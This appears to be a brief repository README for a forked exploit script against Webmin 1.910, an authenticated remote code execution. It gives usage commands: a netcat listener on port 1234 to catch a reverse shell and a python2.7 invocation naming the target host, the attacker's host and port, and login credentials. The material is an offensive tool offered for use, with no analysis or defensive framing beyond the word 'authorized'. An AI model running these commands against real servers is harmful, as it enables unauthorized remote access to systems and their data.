# webmin_rce
webmin rce (authorized)

This script its a fork from https://raw.githubusercontent.com/roughiz/Webmin-1.910-Exploit-Script/master/webmin_exploit.py

The code deletes wrong dependencies in the code. You can use with this poc.

```bash
## terminal1
nc -lvnp 1234
## terminal2
## rhost only ip without :10000
python2.7 webmin_exploit.py  --rhost ip --lhost yourip --lport 1234 -u youruser -p yourpass
```
